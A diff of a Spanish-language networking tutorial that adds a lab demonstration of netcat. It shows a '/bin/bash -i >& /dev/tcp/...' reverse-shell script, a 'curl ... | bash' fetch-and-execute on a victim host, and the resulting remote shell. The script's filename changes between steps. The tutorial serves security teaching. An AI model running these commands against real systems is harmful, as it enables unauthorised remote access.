@@ -356,16 +356,74 @@ Por otra parte, existe la posibilidad de generar un shell inverso entre máquina
 Máquina servidor o víctima:
 
 ```bash
-nc -lvp 1234 -e /bin/sh &
+usuario@debian:~$ nc 192.168.100.250 1331
+Hola
+¿Qué tal estás?  
+Bien
+¿Y tu?
 ```
 
 Máquina cliente o atancante:
 
 ```bash
-nc <IP_VICTIMA> 1234
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 1331
+listening on [any] 1331 ...
+connect to [192.168.100.250] from (UNKNOWN) [192.168.100.8] 40990
+Hola
+¿Qué tal estás?
+Bien
+¿Y tu?
 ```
 
-La cantidad de múltiples usos de netcat (similares a los que podría tener una navaja suiza), ha derivado en calificar este software de esta forma.
+La cantidad de múltiples usos de netcat (similares a los que podría tener una navaja suiza), ha derivado en calificar este software de esta forma. Es por este motivo especialmente interesante el uso de netcat en ciberseguridad para la ejecución de Reverse Shell como se muestra en el siguiente ejemplo:
+
+En el equipo atacante creamos un script para ejecutar una Shell Reversa.
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ cat reverse_shell.sh        
+/bin/bash -i >& /dev/tcp/192.168.100.250/1331 0>&1
+```
+
+A continuación, levantamos un servidor en python3 para que el equipo víctima pueda descargar dicho código y ejecutarse en el creando el tunel.
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+Lanzamos la petición desde el equipo víctima.
+
+```bash
+usuario@debian:~$ curl http://192.168.100.250:8000/reverse_pipy.sh | bash
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    51  100    51    0     0  10043      0 --:--:-- --:--:-- --:--:-- 10200
+```
+
+Podemos comprobar como en nuestra máquina kali hemos tenido un acceso al fichero _*reverse_reverse.sh*_ que se ha ejecurtado en el servidor y como resultado se ha creado un tunel de comunicación, por lo que tenemos una shell en el servidor en la máquina kali atacante.
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+192.168.100.8 - - [14/Apr/2026 18:31:21] "GET /reverse_reverse.sh HTTP/1.1" 200 -
+```
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 1331
+listening on [any] 1331 ...
+connect to [192.168.100.250] from (UNKNOWN) [192.168.100.8] 38656
+usuario@debian:~$ whoami
+whoami
+usuario
+usuario@debian:~$ 
+```
+
+Llegados a este punto el paso siguiente en una práctica de ciberseguridad es estabilizar la shell para poder ejecutar comandos de forma interactiva con normalidad.
 
 #### nmcli
 
